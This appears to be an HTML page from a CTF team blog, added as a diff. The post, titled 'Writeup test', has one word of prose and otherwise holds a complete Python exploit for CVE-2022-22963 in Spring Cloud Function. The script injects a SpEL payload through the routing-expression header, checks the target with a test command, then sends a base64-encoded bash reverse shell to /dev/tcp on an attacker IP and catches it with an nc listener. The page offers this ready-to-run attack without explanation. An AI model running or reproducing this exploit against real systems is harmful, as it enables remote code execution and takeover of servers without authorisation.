@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="CTFs">
+    <link rel="icon" type="image/x-icon" href="/img/null-logo.png">
+    
+    <link rel="stylesheet" href="/css/style.min.1dac2dce58058802a69e8c1e3ae7a2820fa9411cff0cded4211b8a1403b3b8327c23f39304b5650b1ffe9b747ea64029f9c811425cf1ffa0eb081ab9ccec871b.css" integrity="sha512-HawtzlgFiAKmnoweOueigg&#43;pQRz/DN7UIRuKFAOzuDJ8I/OTBLVlCx/&#43;m3R&#43;pkAp&#43;cgRQlzx/6DrCBq5zOyHGw==" crossorigin="anonymous"> 
+    
+
+</head>
+
+<title>
+    
+     Writeup test | nullgang
+   
+</title> 
+
+<body> 
+<header>
+     <div class="cat">
+      <h1><a href="/">nullgang</a></h1>
+     
+      <ul class="header-link">
+        
+        <li><a class="link" href="/">Home</a></li>
+        
+        <li><a class="link" href="/blog/">Blog</a></li>
+        
+        <li><a class="link" href="/members/">Members</a></li>
+        
+      </ul>
+    </div>
+</header>
+<div id="content">
+
+<div class="container">
+		<article>
+			<h1 class="head-blog">Writeup test</h1>
+			<div class="time">Mar 28, 2023</div>
+			<div>
+				<p>testing</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#4e4e4e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">import</span> socket, sys, time
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">from</span> threading <span style="color:#d75f00">import</span> Thread
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#d75f00">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f8700">def</span> <span style="color:#0087ff">nc_listener</span>():
+</span></span><span style="display:flex;"><span>    os.system(<span style="color:#00afaf">&#34;nc -lnvp 4444&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f8700">def</span> <span style="color:#0087ff">exploit</span>(url,cmd):
+</span></span><span style="display:flex;"><span>    vulnURL = <span style="color:#00afaf">f</span><span style="color:#00afaf">&#39;</span><span style="color:#00afaf">{</span>url<span style="color:#00afaf">}</span><span style="color:#00afaf">/functionRouter&#39;</span>
+</span></span><span style="display:flex;"><span>    payload = <span style="color:#00afaf">f</span><span style="color:#00afaf">&#39;T(java.lang.Runtime).getRuntime().exec(&#34;</span><span style="color:#00afaf">{</span>cmd<span style="color:#00afaf">}</span><span style="color:#00afaf">&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>    body = <span style="color:#00afaf">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>    headers = {
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;spring.cloud.function.routing-expression&#39;</span>:payload,
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;Accept-Encoding&#39;</span>: <span style="color:#00afaf">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;Accept&#39;</span>: <span style="color:#00afaf">&#39;*/*&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;Accept-Language&#39;</span>: <span style="color:#00afaf">&#39;en&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;User-Agent&#39;</span>: <span style="color:#00afaf">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00afaf">&#39;Content-Type&#39;</span>: <span style="color:#00afaf">&#39;application/x-www-form-urlencoded&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    response = requests.post(url = vulnURL, data = body, headers = headers, verify=<span style="color:#d75f00">False</span>, timeout=<span style="color:#00afaf">5</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">return</span> response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f8700">def</span> <span style="color:#0087ff">vuln</span>(code,text):
+</span></span><span style="display:flex;"><span>    resp = <span style="color:#00afaf">&#39;&#34;error&#34;:&#34;Internal Server Error&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">if</span> code == <span style="color:#00afaf">500</span> <span style="color:#5f8700">and</span> resp <span style="color:#5f8700">in</span> text:
+</span></span><span style="display:flex;"><span>        <span style="color:#0087ff">print</span>(<span style="color:#00afaf">f</span><span style="color:#00afaf">&#39;[+] </span><span style="color:#00afaf">{</span>args.url<span style="color:#00afaf">}</span><span style="color:#00afaf"> is vulnerable</span><span style="color:#af0000">\n</span><span style="color:#00afaf">&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#5f8700">return</span> <span style="color:#d75f00">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#0087ff">print</span>(<span style="color:#00afaf">f</span><span style="color:#00afaf">&#39;[-] </span><span style="color:#00afaf">{</span>args.url<span style="color:#00afaf">}</span><span style="color:#00afaf"> is not vulnerable</span><span style="color:#af0000">\n</span><span style="color:#00afaf">&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#5f8700">return</span> <span style="color:#d75f00">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f8700">if</span> __name__ == <span style="color:#00afaf">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    parser = argparse.ArgumentParser()
+</span></span><span style="display:flex;"><span>    parser.add_argument(<span style="color:#00afaf">&#34;-u&#34;</span>, <span style="color:#00afaf">&#34;--url&#34;</span>, dest=<span style="color:#00afaf">&#34;url&#34;</span>, help=<span style="color:#00afaf">&#34;URL of the site with spring Framework, example: http://vulnerablesite.com:8080&#34;</span>)
+</span></span><span style="display:flex;"><span>    args = parser.parse_args()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">if</span> args.url <span style="color:#5f8700">is</span> <span style="color:#d75f00">None</span>:
+</span></span><span style="display:flex;"><span>        parser.print_help()
+</span></span><span style="display:flex;"><span>        sys.exit(<span style="color:#00afaf">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#0087ff">print</span>(<span style="color:#00afaf">f</span><span style="color:#00afaf">&#34;[+] Target </span><span style="color:#00afaf">{</span>args.url<span style="color:#00afaf">}</span><span style="color:#af0000">\n</span><span style="color:#00afaf">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#0087ff">print</span>(<span style="color:#00afaf">f</span><span style="color:#00afaf">&#34;[+] Checking if </span><span style="color:#00afaf">{</span>args.url<span style="color:#00afaf">}</span><span style="color:#00afaf"> is vulnerable to CVE-2022-22963...</span><span style="color:#af0000">\n</span><span style="color:#00afaf">&#34;</span>)
+</span></span><span style="display:flex;"><span>    response = exploit(args.url,<span style="color:#00afaf">&#34;touch /tmp/pwned&#34;</span>)
+</span></span><span style="display:flex;"><span>    v = vuln(response.status_code,response.text)
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">if</span> v == <span style="color:#d75f00">True</span>:
+</span></span><span style="display:flex;"><span>        chk = <span style="color:#0087ff">input</span>(<span style="color:#00afaf">&#34;[/] Attempt to take a reverse shell? [y/n]&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#5f8700">if</span> chk == <span style="color:#00afaf">&#39;y&#39;</span> <span style="color:#5f8700">or</span> chk == <span style="color:#00afaf">&#39;Y&#39;</span>:
+</span></span><span style="display:flex;"><span>            listener_thread = Thread(target=nc_listener)
+</span></span><span style="display:flex;"><span>            listener_thread.start()
+</span></span><span style="display:flex;"><span>            time.sleep(<span style="color:#00afaf">2</span>)
+</span></span><span style="display:flex;"><span>            attacker_ip=<span style="color:#0087ff">input</span>(<span style="color:#00afaf">&#34;[$$] Attacker IP:  &#34;</span>)
+</span></span><span style="display:flex;"><span>            command = <span style="color:#00afaf">f</span><span style="color:#00afaf">&#34;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#00afaf">{</span>attacker_ip<span style="color:#00afaf">}</span><span style="color:#00afaf">/4444 0&gt;&amp;1&#34;</span>
+</span></span><span style="display:flex;"><span>            final_command = <span style="color:#00afaf">&#39;bash -c {echo,&#39;</span> + ((<span style="color:#0087ff">str</span>(base64.b64encode(command.encode(<span style="color:#00afaf">&#39;utf-8&#39;</span>)))).strip(<span style="color:#00afaf">&#39;b&#39;</span>)).strip(<span style="color:#00afaf">&#34;&#39;&#34;</span>) + <span style="color:#00afaf">&#39;}|{base64,-d}|{bash,-i}&#39;</span>
+</span></span><span style="display:flex;"><span>            exploit(args.url,final_command)
+</span></span><span style="display:flex;"><span>    <span style="color:#5f8700">else</span>:
+</span></span><span style="display:flex;"><span>    	exit(<span style="color:#00afaf">0</span>)
+</span></span></code></pre></div>
+			</div>
+
+		</article>
+	</div>
+	<div class="blog container">
+   <div class="head-blog">
+    <h3>Related article</h3>
+   </div>
+<ul class="article-list">
+
+	
+<li class="post">      
+    <span>Mar 28, 2023 </span> 
+    <a class="blog-title" href="/blog/cat/">Cool Cat</a>
+</li>
+
+
+	
+<li class="post">      
+    <span>Mar 28, 2023 </span> 
+    <a class="blog-title" href="/blog/kitty/">Cool Kitty</a>
+</li>
+
+
+	
+
+ </ul>
+</div>
+
+
+</div>
+<footer class="footer">
+    <p><a href="https://github.com/null-gang">Github</a></p>
+</footer>
+
+
+</body>
+</html>
